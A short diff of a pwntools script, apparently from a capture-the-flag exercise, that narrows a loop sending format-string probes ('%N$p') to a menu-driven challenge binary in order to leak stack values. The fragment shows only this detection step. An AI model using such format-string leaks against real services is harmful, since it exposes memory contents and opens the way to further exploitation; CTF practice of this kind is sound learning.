@@ -3,7 +3,7 @@ from pwn import *
 context.log_level = 'debug'
 
 def detect(io):
-	for i in range(100):
+	for i in range(20):
 		svar = '%'+str(i+1)+'$p'
 		io.recvuntil('2. Space food')
 		io.sendline(b'1')
